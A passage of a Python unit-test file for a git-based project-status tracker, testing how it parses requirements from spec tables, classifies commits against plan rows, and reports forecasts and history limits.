        self.assertEqual([(item.ident, item.words) for item, _ in found["items"]], [("REQ-2", "Export"), ("REQ-1", "Sign in")])

    def test_w6_a_fresh_start_takes_the_title_and_not_the_priority(self):
        self.plan_path.unlink()
        (self.repo / "spec.md").write_text("| Title | ID | Priority |\n|---|---|---|\n| Sign in | REQ-1 | High |\n| Export | REQ-2 | High |\n")
        self.assertEqual(self.engine("init", "--from-checklist", "spec.md").returncode, 0)
        table = tables.load_clean(self.plan())
        self.assertEqual([r.name for d in table.domains for r in d.rows], ["Sign in", "Export"])

    # W7: words that are true of every limit, and none when no limit mattered
    def test_w7_the_list_of_commits_cut_short_is_said(self):
        self.moving_commits()
        with unittest.mock.patch.object(focus, "MOST_COMMITS_LISTED", 3):
            found = self.found()
        self.assertEqual(found["commits"], 3)
        self.assertTrue(found["newest_only"])
        self.assertNotIn("in time", focus.text(found))

    def test_w7_a_list_that_reaches_past_the_window_says_nothing(self):
        self.write_table()
        self.commit("2026-01-01", "first")
        for day in range(2, 7):
            self.commit(f"2026-01-0{day}", f"old {day}", files={f"{day}.py": "1\n"}, table=False)
        self.commit("2026-03-29", "row 1: recent", files={"new.py": "1\n"}, table=False)
        with unittest.mock.patch.object(focus, "MOST_COMMITS_LISTED", 3):
            found = focus.data(self.plan(), days=14, today=datetime.date(2026, 3, 30))
        self.assertEqual((found["commits"], found["newest_only"]), (1, False))

    # W9
    def merged_in(self, message):
        self.named("Export", "Billing")
        self.write_table()
        self.commit("2026-03-01", "start")
        git(self.repo, "checkout", "-q", "-b", "feature")
        self.commit("2026-03-02", "Add the exporter", files={"src/x.py": "1\n"}, table=False)
        git(self.repo, "checkout", "-q", "main")
        self.merge_commit("feature", day="2026-03-03", message=message)

    def test_w9_a_merge_request_is_read_whatever_the_subject_says(self):
        self.merged_in("Merge branch 'feature' into 'main'\n\nSee merge request acme/shop!12")
        table = self.repo / "status-table.md"
        table.write_text(table.read_text().replace("| 1 | Export | Not built |  |", "| 1 | Export | Partial | MR !12 |"))
        self.commit("2026-03-04", "tracker: mark", table=False)
        found = self.judged()["Add the exporter"]
        self.assertEqual((found["class"], found["rows"]), (focus.ON, [1]))

    def test_w9_so_is_a_row_in_the_body(self):
        self.merged_in("Merge branch 'feature' into 'main'\n\nFor row 2")
        self.assertEqual(self.judged()["Add the exporter"]["rows"], [2])

    def test_w9_into_a_row_s_branch_still_says_nothing_of_what_it_brings(self):
        self.named("Export", "Billing")
        self.write_table()
        self.commit("2026-03-01", "start")
        git(self.repo, "checkout", "-q", "-b", "row-2-billing")
        self.commit("2026-03-02", "row 2: the bill", files={"b.py": "1\n"}, table=False)
        git(self.repo, "checkout", "-q", "main")
        self.commit("2026-03-03", "Unrelated on main", files={"m.py": "1\n"}, table=False)
        git(self.repo, "checkout", "-q", "row-2-billing")
        self.merge_commit("main", day="2026-03-04", message="Merge branch 'main' into row-2-billing")
        self.assertNotEqual(self.judged()["Unrelated on main"]["class"], focus.ON)

    # W10
    def test_w10_the_burndown_ends_where_eta_does(self):
        self.write_plan(kinds=[{"name": "Live", "weight": 0.9, "evidence": "release"}, {"name": "Not built", "weight": 0.0}])
        self.named("A", "B")
        self.write_table()
        self.commit("2026-02-01", "first")
        self.set_row(1, "Live")
        self.commit("2026-02-10", "row 1")
        self.set_row(2, "Live")
        self.commit("2026-02-20", "row 2")
        found = self.data()
        points = chart.points(self.plan(), today=TODAY.isoformat())
        self.assertEqual(found["left"], 0)
        self.assertEqual(chart.burndown_csv(points).splitlines()[-1], "2026-02-20,2,0,0")
        self.assertEqual(points[-1]["weighted"], 1.8)
        self.assertIn('<tspan class="value">0</tspan> rows left, all work', chart.burndown(points, "T", found, forecast.headline(found)))

    # W11
    def test_w11_a_mark_that_changes_what_is_asked_is_part_of_the_words(self):
        for one, other in (("Reject files > 10 MB", "Reject files < 10 MB"), ("Support C++", "Support C"), ("Support C#", "Support C"), ("Charge $5", "Charge 5"), ("Discount 10%", "Discount 10")):
            with self.subTest(one):
                self.assertNotEqual(requirements._said(one), requirements._said(other))

    def test_w11_punctuation_is_still_aside(self):
        for one, other in (("Sign-in, with a link.", "sign in with a link"), ("Export (PDF)", "export pdf"), ("“Quick” search", "quick search"), ("and/or", "and or")):
            with self.subTest(one):
                self.assertEqual(requirements._said(one), requirements._said(other))

    # W12
    def test_w12_a_test_is_code(self):
        for path in ("tests/test_a.py", "spec/a_spec.rb", "__tests__/a.js", "src/a.test.ts", "a_test.go", "tests/run.sh", "test/a.java", "features/tests/a.feature"):
            with self.subTest(path):
                self.assertTrue(trace._is_test(path))
        for path in ("tests/.gitkeep", "tests/data/sample.bin", "tests/data/sample.py", "tests/fixtures/a.py", "testdata/a.go", "tests/__init__.py", "tests/conftest.py", "src/a.py", "tests/sample.pdf", "tests/README"):
            with self.subTest(path):
                self.assertFalse(trace._is_test(path))

    # W13: limits that said nothing
    def test_w13a_the_pattern_past_the_limit_is_said(self):
        self.write_table()
        self.write_plan(focus={"paths": {"1": [f"one{i}/*" for i in range(500)], "2": ["two/*"]}})
        plan = self.plan()
        self.assertEqual(sum(len(p) for p in plan.focus["paths"].values()), 500)
        self.assertEqual(sum("file patterns" in words for words in plan.signal_problems), 1)

    def test_w13a_up_to_the_limit_nothing_is_lost(self):
        self.write_table()
        self.write_plan(focus={"paths": {"1": [f"one{i}/*" for i in range(499)], "2": ["two/*"]}})
        plan = self.plan()
        self.assertEqual(plan.focus["paths"]["2"], ["two/*"])
        self.assertEqual(plan.signal_problems, [])

    def test_w13b_a_row_at_the_end_of_a_long_message_is_read(self):
        self.write_table()
        self.commit("2026-03-01", "first")
        self.commit("2026-03-05", "Long\n\n" + "detail line\n" * 1000 + "\nrow 2", files={"x.py": "1\n"}, table=False)
        self.assertEqual(self.judged()["Long"]["rows"], [2])

    def test_w13c_what_sorts_past_the_list_of_files_still_counts(self):
        self.write_table()
        self.commit("2026-03-01", "first")
        self.commit("2026-03-05", "Handbook and the whole app", files={"docs/1.txt": "1\n", "docs/2.txt": "1\n", "src/app.py": "1\n" * 50}, table=False)
        with unittest.mock.patch.object(focus, "MOST_FILES_IN_A_COMMIT", 2):
            self.assertEqual(self.judged()["Handbook and the whole app"]["class"], focus.OFF)

    def test_w13c_and_counts_against_what_the_plan_ties_to_a_row(self):
        self.write_plan(focus={"paths": {"1": ["a/"]}})
        self.write_table()
        self.commit("2026-03-01", "first")
        self.commit("2026-03-05", "Mostly elsewhere", files={"a/1.txt": "1\n", "a/2.txt": "1\n", "z/app.py": "1\n" * 50}, table=False)
        with unittest.mock.patch.object(focus, "MOST_FILES_IN_A_COMMIT", 2):
            self.assertEqual(self.judged()["Mostly elsewhere"]["class"], focus.OFF)

    def cut_history(self):
        self.commit("2026-02-01", "first")
        for i, day in enumerate(("2026-02-05", "2026-02-10", "2026-02-15", "2026-02-20"), start=1):
            self.move(i, "Partial", day)
        return unittest.mock.patch.object(gitio, "MOST_BYTES_OF_HISTORY", len(table_text(self.rows)) * 3 + 10)

    def test_w13d_eta_says_it_read_part_of_the_history(self):
        with self.cut_history():
            found = self.data()
        self.assertTrue(found["newest_only"])
        self.assertIn("Only the newest part of the table's history", forecast.text(found))
        self.assertFalse(self.data()["newest_only"])

    def test_w13d_so_does_the_chart(self):
        with self.cut_history():
            items = chart.points(self.plan(), today=TODAY.isoformat())
            found = self.data()
        self.assertTrue(items.newest_only)
        self.assertEqual(items[0]["date"], "2026-02-10")
        self.assertIn("Only the newest part", chart.svg(items, "T"))
        self.assertIn("Only the newest part", chart.burndown(items, "T", found, forecast.headline(found)))
        self.assertFalse(chart.points(self.plan(), today=TODAY.isoformat()).newest_only)

    def test_w13d_the_command_says_it_where_the_data_stays_clean(self):
        self.commit("2026-02-01", "first")
        for i, day in enumerate(("2026-02-05", "2026-02-10", "2026-02-15", "2026-02-20"), start=1):
            self.move(i, "Partial", day)
        out, err = io.StringIO(), io.StringIO()
        with unittest.mock.patch.object(gitio, "MOST_BYTES_OF_HISTORY", len(table_text(self.rows)) * 3 + 10), contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            code = cli.main(["chart", "--plan", str(self.plan_path), "--csv"])
        self.assertEqual(code, 0)
        self.assertTrue(out.getvalue().startswith("date,scope"))
        self.assertIn("Only the newest part", err.getvalue())

    def test_w13e_a_cut_in_the_table_s_history_leaves_another_repository_s_commits(self):
        other = self.tmp / "code"
        other.mkdir()
        git(other, "init", "-q", "-b", "main")
        self.commit("2026-03-10", "Older", files={"a.py": "1\n"}, table=False, where=other)
        self.commit("2026-03-20", "Newer", files={"b.py": "1\n"}, table=False, where=other)
        self.write_plan(repo=str(other))
        self.commit("2026-03-01", "first")
        for i, day in enumerate(("2026-03-22", "2026-03-23", "2026-03-24", "2026-03-25"), start=1):
            self.move(i, "Partial", day)
        with unittest.mock.patch.object(gitio, "MOST_BYTES_OF_HISTORY", len(table_text(self.rows)) * 3 + 10):
            self.assertEqual(set(self.judged()), {"Older", "Newer"})

    # W14: what the docs promise
    def test_w14_a_percent_across_groups_says_so(self):
        self.write_plan(groups=[{"id": "m", "label": "MVP", "domains": [1]}, {"id": "l", "label": "Later", "domains": [2]}])
        (self.repo / "status-table.md").write_text("# Project\n\n### 1. One (1)\n\n| # | Name | Status | Note |\n|---|---|---|---|\n| 1 | A | Partial | wip |\n\n### 2. Two (1)\n\n| # | Name | Status | Note |\n|---|---|---|---|\n| 2 | B | Not built |  |\n")
        self.commit("2026-03-01", "first", table=False)
        self.assertIn("Scope now, all groups:", forecast.text(self.data()))
        self.assertIn("Scope now:", forecast.text(forecast.data(self.plan(), group="m", today=TODAY)))

    def test_w14_a_project_file_in_a_folder_is_a_project_file(self):
        self.write_table()
        self.commit("2026-03-01", "first")
        self.commit("2026-03-05", "CI for the frontend", files={"frontend/.github/workflows/ci.yml": "x\n"}, table=False)
        self.assertEqual(self.judged()["CI for the frontend"]["class"], focus.UPKEEP)

    def test_w14_a_note_s_test_path_can_be_from_the_plan_s_folder_or_from_repo(self):
        self.named("A", "B")
        self.write_plan(repo="app")
        self.write_table()
        table = self.repo / "status-table.md"
        table.write_text(table.read_text().replace("| 1 | A | Not built |  |", "| 1 | A | Not built | `app/tests/test_a.py` |").replace("| 2 | B | Not built |  |", "| 2 | B | Not built | `tests/test_a.py` |"))
        self.commit("2026-03-01", "first", files={"app/tests/test_a.py": "1\n"}, table=False)
        rows = trace.rows_data(self.plan(), offline=True)
        self.assertEqual([r["tests"] for r in rows], [["app/tests/test_a.py"], ["tests/test_a.py"]])


class TheFifthAttack(Case):
    """What a fifth reader found in the fixes for the fourth: X1 to X19. Most of it is a rule gone too far, and each test holds what was right before that rule."""

    named, set_row, found, judged, merge_commit, spec = (TheFourthAttack.named, TheFourthAttack.set_row, TheFourthAttack.found, TheFourthAttack.judged,
                                                         TheFourthAttack.merge_commit, TheFourthAttack.spec)

    def parsed(self, text):
        return [(item.ident, item.words) for item in requirements.parse(text, "spec.md")]

    def coverage(self):
        return requirements.coverage(self.plan(), tables.load_clean(self.plan()))

    # X1: a requirement lost is a gap nobody sees
    def test_x1_the_gap_stays_open(self):
        self.named("Login", "Thing two")
        self.write_table()
        self.spec("- REQ-1: Login\n\n| # | Requirement | Status |\n|---|---|---|\n| 1 | REQ-2: Export data | Open |\n| 2 | REQ-3: Delete account | Open |\n")
        self.assertEqual([item.ident for item in self.coverage()["without"]], ["REQ-2", "REQ-3"])
        self.assertIn("2 requirements have no row", requirements.opener_line(self.plan(), tables.load_clean(self.plan())))

    def test_x1_a_fresh_start_has_a_row_for_each(self):
        self.plan_path.unlink()
        (self.repo / "spec.md").write_text("- REQ-1: Login\n\n| # | Requirement | Status |\n|---|---|---|\n| 1 | REQ-2: Export data | Open |\n| 2 | REQ-3: Delete account | Open |\n")
        self.assertEqual(self.engine("init", "--from-checklist", "spec.md").returncode, 0)
        self.assertEqual([r.name for d in tables.load_clean(self.plan()).domains for r in d.rows], ["Login", "Export data", "Delete account"])

    # X2: what was written before the table began, on another line
    def tracker_on_a_branch(self):
        self.named("Login", "Export")
        self.commit("2026-03-01", "base", files={"app.py": "a\n"}, table=False)
        git(self.repo, "checkout", "-q", "-b", "add-tracker")
        self.commit("2026-03-20", "add the tracker")
        git(self.repo, "checkout", "-q", "main")
        for day in ("2026-03-10", "2026-03-11", "2026-03-12"):
            self.commit(day, f"unrelated on {day}", files={f"{day}.py": "1\n"}, table=False)
        self.commit("2026-03-15", "row 1: the first row of the grid", files={"tests/test_grid.py": "1\n"}, table=False)
        self.merge_commit("add-tracker", day="2026-03-21", message="Merge add-tracker")

    def test_x2_work_from_before_the_table_is_not_off_its_plan(self):
        self.tracker_on_a_branch()
        found = self.found()
        self.assertEqual((found["commits"], found["off_plan"]), (0, 0))
        self.assertIsNone(focus.opener_line(self.plan(), today=datetime.date(2026, 3, 25)))

    def test_x2_nor_does_it_give_a_row_a_test(self):
        self.tracker_on_a_branch()
        row = trace.rows_data(self.plan(), offline=True)[0]
        self.assertEqual((row["tests"], row["named_by"]), ([], []))

    def test_x2_what_came_after_it_counts(self):
        self.tracker_on_a_branch()
        self.commit("2026-03-22", "row 1: login", files={"login.py": "1\n", "tests/test_login.py": "1\n"}, table=False)
        self.assertEqual(self.found()["on_plan"], 1)
        self.assertEqual(trace.rows_data(self.plan(), offline=True)[0]["tests"], ["tests/test_login.py"])

    def test_x2_a_commit_on_from_the_table_counts_whatever_its_date(self):
        self.named("Login", "Export")
        self.commit("2026-03-20", "add the tracker")
        self.commit("2026-03-01", "row 1: written before, worded after", committer="2026-03-25", files={"tests/test_login.py": "1\n"}, table=False)
        self.assertEqual(trace.rows_data(self.plan(), offline=True)[0]["tests"], ["tests/test_login.py"])
        self.assertEqual(self.judged()["row 1: written before, worded after"]["class"], focus.ON)

    def test_x2_a_line_of_work_merged_later_counts_from_when_it_was_written(self):
        self.named("Login", "Export")
        self.commit("2026-03-01", "base", files={"app.py": "a\n"}, table=False)
        git(self.repo, "checkout", "-q", "-b", "feature")
        self.commit("2026-03-05", "Before the table", files={"f.py": "1\n"}, table=False)
        self.commit("2026-03-25", "row 1: after the table", files={"tests/test_f.py": "1\n"}, table=False)
        git(self.repo, "checkout", "-q", "main")
        self.commit("2026-03-20", "add the tracker")
        self.merge_commit("feature", day="2026-03-26", message="Merge feature")
        found = self.judged()
        self.assertNotIn("Before the table", found)
        self.assertEqual(found["row 1: after the table"]["class"], focus.ON)

    def test_x2_a_second_root_is_no_different(self):
        self.named("Login", "Export")
        self.commit("2026-03-01", "root A", files={"app.py": "a\n"}, table=False)
        self.commit("2026-03-03", "older work", files={"older.py": "1\n"}, table=False)
        git(self.repo, "checkout", "-q", "--orphan", "tracker")
        git(self.repo, "rm", "-q", "-r", "-f", ".")
        self.write_plan()
        self.commit("2026-03-10", "root B: the tracker")
        git(self.repo, "checkout", "-q", "main")
        self.merge_commit("--allow-unrelated-histories", "tracker", day="2026-03-11", message="Merge tracker")
        self.commit("2026-03-20", "row 1: login", files={"login.py": "1\n"}, table=False)
        found = self.found()
        self.assertEqual((found["commits"], found["on_plan"]), (1, 1))

    # X3: a table that arrived in a merge
    def subtree(self):
        self.plan_path.unlink()
        self.named("Login", "Export")
        self.commit("2026-03-01", "mono base", files={"app.py": "a\n"}, table=False)
        git(self.repo, "checkout", "-q", "--orphan", "imported")
        git(self.repo, "rm", "-q", "-r", "-f", ".")
        self.write_plan()
        imported = self.commit("2026-03-05", "project history")
        git(self.repo, "checkout", "-q", "main")
        git(self.repo, "merge", "-q", "-s", "ours", "--no-commit", "--allow-unrelated-histories", imported)
        git(self.repo, "read-tree", "--prefix=proj/", "-u", imported)
        git(self.repo, "commit", "-q", "-m", "Subtree import of proj", env={"GIT_AUTHOR_DATE": "2026-03-08T12:00:00", "GIT_COMMITTER_DATE": "2026-03-08T12:00:00"})
        where = self.repo / "proj"
        self.plan_path = where / ".gitdone.json"
        self.commit("2026-03-10", "row 1: login with its test", files={"tests/test_login.py": "1\n"}, table=False, where=where)
        self.commit("2026-03-12", "stray work", files={"code.py": "1\n"}, table=False, where=where)

    def test_x3_it_began_at_that_merge(self):
        self.subtree()
        found = self.found()
        self.assertEqual((found["commits"], found["on_plan"], found["off_plan"]), (2, 1, 1))
        self.assertEqual(trace.rows_data(self.plan(), offline=True)[0]["tests"], ["tests/test_login.py"])
        self.assertIn("off plan", focus.last_line(self.plan()))

    def test_x3_and_a_later_commit_of_the_table_does_not_move_that(self):
        self.subtree()
        self.set_row(1, "Partial")
        (self.repo / "proj" / "status-table.md").write_text(table_text(self.rows))
        self.commit("2026-03-14", "mark it", files={"more.py": "1\n"}, table=False, where=self.repo / "proj")
        self.assertEqual(set(self.judged()), {"row 1: login with its test", "stray work", "mark it"})

    # X4: a number as a workstream's id
    def test_x4_a_number_is_an_id(self):
        self.write_table()
        for keys in ({"workstreams": [{"id": 1, "name": "One", "rows": [1]}]}, {"workstreams": [{"id": 1, "rows": [1]}], "order": []}, {"workstreams": [{"id": 1, "rows": [1]}], "order": [1]}):
            with self.subTest(str(keys)):
                self.write_plan(**keys)
                self.assertEqual(self.engine("render", "--write").returncode, 0)
                done = self.engine("check", "--offline")
                self.assertEqual(done.returncode, 0, done.stdout + done.stderr)

    def test_x4_an_order_that_names_nobody_is_what_it_always_was(self):
        self.write_table()
        self.write_plan(order=[1])
        done = self.engine("check", "--offline")
        self.assertEqual(done.returncode, 1, done.stdout + done.stderr)
        self.assertNotIn("TypeError", done.stdout + done.stderr)

    # X5, X15: punctuation is punctuation, in any script
    def test_x5_what_is_punctuation_anywhere_is_aside(self):
        for one, other in (("Sign\u2011in with SMS", "Sign-in with SMS"), ("Sign\u2010in", "Sign-in"), ("A\u2015B", "A B"), ("用户可以登录。", "用户可以登录"), ("甲，乙", "甲 乙"), ("（甲）", "甲"), ("¿Olvidó la contraseña?", "Olvidó la contraseña"),
                           ("¡Hola!", "Hola"), ("„Quick“ search", "Quick search"), ("ماذا؟", "ماذا"), ("क्या।", "क्या"), ("Soft\u00adhyphen", "Soft-hyphen"), ("Zero\u200bwidth", "Zero-width"), ("\u200fRight", "Right"),
                           ("• Bullet", "Bullet"), ("Brand™", "Brand"), ("Step #1", "Step 1"), ("Home -> Settings", "Home Settings"), ("🚀 Launch", "Launch"), ("Login => Home", "Login Home")):
            with self.subTest(one):
                self.assertEqual(requirements._said(one), requirements._said(other))

    def test_x15_a_mark_that_changes_what_is_asked_is_not(self):
        for one, other in (("status != 200", "status = 200"), ("x -1", "x 1"), ("x +1", "x 1"), ("x >= 1", "x > 1"), ("x < 1", "x > 1"), ("−5 degrees", "5 degrees"), ("A+", "A"), ("€5", "5")):
            with self.subTest(one):
                self.assertNotEqual(requirements._said(one), requirements._said(other))

    # X6: a line with no words of its own
    def test_x6_it_does_not_erase_the_words_a_table_gave(self):
        self.named("Login with SMS", "Export data")
        self.write_table()
        self.spec("| ID | Title |\n|---|---|\n| REQ-1 | Login with SMS |\n| REQ-2 | Export data |\n\n### REQ-1\n\nDetails.\n\n- REQ-2: see the table above\n")
        self.assertEqual(self.coverage()["without"], [])

    def test_x6_and_a_line_with_words_fills_in_for_one_without(self):
        self.named("Login with SMS")
        self.write_table()
        self.spec("### REQ-1\n\nDetails.\n\n| ID | Title |\n|---|---|\n| REQ-1 | Login with SMS |\n")
        self.assertEqual(self.coverage()["without"], [])

    # X7: the words about a limit, only when a limit took something
    def test_x7_a_cut_older_than_what_was_asked_for_is_not_said(self):
        self.commit("2026-02-01", "first")
        for i, day in enumerate(("2026-02-05", "2026-02-10", "2026-02-15", "2026-02-20"), start=1):
            self.move(i, "Partial", day)
        self.commit("2026-02-25", "row 5: a small change", files={"a.py": "1\n"}, table=False)
        with unittest.mock.patch.object(gitio, "MOST_BYTES_OF_HISTORY", len(table_text(self.rows)) * 3 + 10):
            found = focus.data(self.plan(), revisions="HEAD~1..HEAD", today=TODAY)
        self.assertEqual((found["commits"], found["newest_only"]), (1, False))
        self.assertNotIn("as far as", focus.counts_words(found))

    def test_x7_nor_with_only_the_tracker_s_commits_in_it(self):
        self.commit("2026-02-01", "first")
        for i, day in enumerate(("2026-02-05", "2026-02-10", "2026-02-15", "2026-02-20"), start=1):
            self.move(i, "Partial", day, message="mark it")
        with unittest.mock.patch.object(gitio, "MOST_BYTES_OF_HISTORY", len(table_text(self.rows)) * 3 + 10):
            found = focus.data(self.plan(), revisions="HEAD~1..HEAD", today=TODAY)
        self.assertEqual(focus.counts_words(found), "")

    def renamed_many_times(self, count=12):
        self.write_table()
        self.commit("2026-03-01", "start")
        self.set_row(1, "Partial")
        self.commit("2026-03-02", "Login form", files={"login.py": "1\n"})
        name = "status-table.md"
        for i in range(count):
            git(self.repo, "mv", name, f"table{i}.md")
            name = f"table{i}.md"
            self.write_plan(status_doc=name)
            self.commit("2026-03-03", f"Rename {i}", table=False)

    def test_x7_a_table_renamed_many_times_is_no_limit_reached(self):
        self.renamed_many_times()
        self.commit("2026-03-05", "row 1: work", files={"a.py": "1\n"}, table=False)
        found = self.found()
        self.assertEqual((found["commits"], found["on_plan"], found["newest_only"]), (2, 2, False))
        self.assertEqual({c["subject"]: c["class"] for c in found["list"]}["Login form"], focus.ON)

    def test_x7_with_no_time_for_its_old_names_what_needed_them_is_not_judged(self):
        self.renamed_many_times()
        reading = focus._Reading(self.plan(), None, datetime.date(2026, 3, 30))
        commits = focus.read_commits(reading.repo, "HEAD")
        reading.ends = time.monotonic() - 1
        self.assertEqual(focus._moves(reading, commits), [])
        self.assertTrue(reading.capped)

    # X8: linear on what a spec holds
    def test_x8_a_long_run_of_spaces_in_a_table_costs_what_it_weighs(self):
        text = "- REQ-1: Aaa\n" + ("|---" + " " * 1990 + "x\n") * 600
        started = time.monotonic()
        self.assertEqual(self.parsed(text), [("REQ-1", "Aaa")])
        self.assertLess(time.monotonic() - started, 3.0)

    # X9: what is shown, and what is read
    def test_x9_what_is_shown_of_a_subject_has_an_end(self):
        self.write_table()
        self.commit("2026-03-01", "first")
        self.commit("2026-03-05", "Fix things " * 100, files={"h.py": "1\n"}, table=False)
        self.assertEqual(len(self.found()["list"][0]["subject"]), focus.LONGEST_SUBJECT)

    def test_x9_and_so_does_what_is_read_of_a_message(self):
        self.write_table()
        self.commit("2026-03-01", "first")
        self.commit("2026-03-05", "Long\n\n" + "words\n" * 100 + "row 2", files={"h.py": "1\n"}, table=False)
        with unittest.mock.patch.object(focus, "LONGEST_MESSAGE", 50):
            self.assertLessEqual(len(focus.read_commits(self.repo, "-1", "HEAD")[0]["message"]), 50)

    # X10: tests in every language
    def test_x10_a_test_is_what_is_not_data(self):
        for path in ("test/runtests.jl", "test/Spec.hs", "test/Token.t.sol", "tests/foo.cxx", "tests/run.ps1", "tests/foo.zig", "spec/foo.cr", "tests/foo.nim", "tests/foo.ml", "test/foo.hpp", "tests/test_foo.py"):
            with self.subTest(path):
                self.assertTrue(trace._is_test(path))

    # X11: a walk of all the history, when something asks
    def test_x11_the_hook_walks_all_of_it_only_when_it_is_about_to_speak(self):
        self.write_table()
        self.commit("2026-03-01", "start")
        self.commit("2026-03-05", "row 1: on plan", files={"a.py": "1\n"}, table=False)
        with unittest.mock.patch.object(focus.history, "table_commits", wraps=history.table_commits) as walks:
            self.assertIsNone(focus.last_line(self.plan()))
        self.assertEqual([c.kwargs.get("topological", False) for c in walks.call_args_list], [False])

    # X12: what git wrote about a merge
    def test_x12_what_merge_log_lists_is_nobody_s_word(self):
        self.named("Aaa", "Bbb")
        self.write_table()
        self.commit("2026-03-01", "start")
        git(self.repo, "checkout", "-q", "-b", "row-1-aaa")
        self.commit("2026-03-02", "row 1: start", files={"r.py": "1\n"}, table=False)
        git(self.repo, "checkout", "-q", "main")
        self.commit("2026-03-03", "row 2: main work", files={"m1.py": "1\n"}, table=False)
        self.commit("2026-03-04", "unrelated on main", files={"m2.py": "1\n"}, table=False)
        git(self.repo, "checkout", "-q", "row-1-aaa")
        self.merge_commit("main", day="2026-03-05", message="Merge branch 'main' into row-1-aaa\n\n* main:\n  row 2: main work\n  unrelated on main\n")
        self.assertNotEqual(self.judged()["unrelated on main"]["class"], focus.ON)

    def test_x12_and_a_person_s_words_under_it_still_count(self):
        self.named("Aaa", "Bbb")
        self.write_table()
        self.commit("2026-03-01", "start")
        git(self.repo, "checkout", "-q", "-b", "feature")
        self.commit("2026-03-02", "A piece of it", files={"r.py": "1\n"}, table=False)
        git(self.repo, "checkout", "-q", "main")
        self.merge_commit("feature", day="2026-03-05", message="Merge branch 'feature'\n\nThis is row 2.\n\n* feature:\n  A piece of it\n")
        self.assertEqual(self.judged()["A piece of it"]["rows"], [2])

    # X13: a commit past the list of files, judged by both ends of it
    def test_x13_all_docs_is_upkeep_however_many(self):
        self.write_table()
        self.commit("2026-03-01", "first")
        self.commit("2026-03-05", "Import the manual", files={f"docs/{i}.md": "1\n" for i in range(5)}, table=False)
        with unittest.mock.patch.object(focus, "MOST_FILES_IN_A_COMMIT", 2):
            self.assertEqual(self.judged()["Import the manual"]["class"], focus.UPKEEP)

    # X14: a column the heading names comes first
    def test_x14_the_id_is_where_the_heading_says(self):
        self.assertEqual(self.parsed("| Parent | ID | Title |\n|---|---|---|\n| REQ-90 | REQ-10 | Login |\n"), [("REQ-10", "Login")])
        self.assertEqual(self.parsed("| Title | ID | Priority |\n|---|---|---|\n| SMS-2 login | REQ-9 | High |\n"), [("REQ-9", "SMS-2 login")])

    # X17: a percent across groups says so with or without a date
    def test_x17_the_portfolio_says_all_groups_without_a_date(self):
        entry = {"project": "p", "rows": 3, "strict_rows": 1, "strict": 1 / 3, "weighted": 1 / 3, "likely": None, "all_groups": True, "next": None, "next_name": None, "gate": "pass", "contradicted": 0, "missing": 0}
        self.assertIn("| p (all groups) |", portfolio.markdown([entry]))
        self.assertNotIn("all groups", portfolio.markdown([{**entry, "all_groups": False}]))

    # X18: a table that came back
    def test_x18_a_table_brought_back_is_a_table_moved(self):
        self.named("Aaa", "Bbb")
        self.write_table()
        self.commit("2026-03-01", "start")
        git(self.repo, "rm", "-q", "status-table.md")
        self.commit("2026-03-02", "drop the table", files={"b.py": "1\n"}, table=False)
        self.set_row(1, "Partial")
        self.commit("2026-03-05", "bring it back and move a row", files={"d.py": "1\n"})
        self.assertEqual(self.judged()["bring it back and move a row"]["class"], focus.ON)

    # X19: one id, one row
    def test_x19_a_fresh_start_has_one_row_for_one_id(self):
        self.plan_path.unlink()
        (self.repo / "spec.md").write_text("| ID | Title |\n|---|---|\n| REQ-1 | Login |\n\n- REQ-1: Login with SMS\n\n| Area | Ref |\n|---|---|\n| Billing | REQ-2 |\n\n- REQ-2: Export\n")
        self.assertEqual(self.engine("init", "--from-checklist", "spec.md").returncode, 0)
        self.assertEqual([r.name for d in tables.load_clean(self.plan()).domains for r in d.rows], ["Login", "Export"])

    # What the same reader could only read
    def test_two_drives_of_one_machine_have_no_path_between_them(self):
        with unittest.mock.patch.object(os.path, "relpath", side_effect=ValueError("path is on mount 'D:'")):
            self.assertEqual(focus._from_plan_folder("C:/code", "D:/plan")("a.py"), "a.py")

    def test_when_git_cannot_say_nothing_is_called_off_plan(self):
        self.write_table()
        self.commit("2026-03-01", "start")
        self.commit("2026-03-05", "Work", files={"a.py": "1\n"}, table=False)
        with unittest.mock.patch.object(gitio, "objects", return_value=None):
            found = self.found()
        self.assertEqual((found["commits"], found["newest_only"]), (0, True))


class WhatATableInASpecSays(Case):
    """Five readers each found a rule for a table in a spec losing requirements or inventing them, and each new rule broke what the last had fixed. So every shape any of them tried is here at once."""

    SHAPES = (
        ("the usual one", "| ID | Requirement | Priority |\n|---|---|---|\n| REQ-1 | Sign in | High |\n", [("REQ-1", "Sign in")]),
        ("numbered", "| # | ID | Requirement |\n|---|---|---|\n| 1 | REQ-12 | In a numbered table |\n| 2 | **REQ-13** | Marked |\n| 3 | REQ-14: Its own words | high |\n| 4 | See REQ-1 | no |\n| 5 | UTF-8 | no |\n",
         [("REQ-12", "In a numbered table"), ("REQ-13", "Marked"), ("REQ-14", "Its own words")]),
        ("words before the id", "| Title | ID | Priority |\n|---|---|---|\n| Sign in | REQ-1 | High |\n| Export | REQ-2 | High |\n", [("REQ-1", "Sign in"), ("REQ-2", "Export")]),
        ("words after the id", "| Priority | Req ID | Requirement |\n|---|---|---|\n| High | REQ-1 | Sign in |\n", [("REQ-1", "Sign in")]),
        ("the id last", "| Title | ID |\n|---|---|\n| Sign in | REQ-1 |\n", [("REQ-1", "Sign in")]),
        ("headed Ref", "| Thing | Ref |\n|---|---|\n| Sign in | REQ-1 |\n", [("REQ-1", "Sign in")]),
        ("the first column, whatever it is called", "| Thing | Words |\n|---|---|\n| REQ-1 | Sign in |\n| REQ-2: Export | High |\n", [("REQ-1", "Sign in"), ("REQ-2", "Export")]),
        ("no heading at all", "| REQ-1 | Sign in |\n", [("REQ-1", "Sign in")]),
        ("prose in a cell", "| Feature | Status |\n|---|---|\n| Export | REQ-3 was dropped in v2 |\n", []),
        ("a reference", "| Area | Depends on |\n|---|---|\n| Billing | REQ-2 |\n", []),
        ("its colon anywhere", "| # | Anything at all | Status |\n|---|---|---|\n| 1 | REQ-2: Export data | Open |\n| 2 | ENG-3: Delete account | Open |\n", [("REQ-2", "Export data"), ("ENG-3", "Delete account")]),
        ("no rule", "| 1 | REQ-2: Export data |\n| 2 | REQ-3: Delete |\n", [("REQ-2", "Export data"), ("REQ-3", "Delete")]),
        ("resumed after text", "| # | R |\n|---|---|\n| 1 | REQ-2: Export data |\n\nSome words.\n\n| 2 | REQ-3: Delete |\n", [("REQ-2", "Export data"), ("REQ-3", "Delete")]),
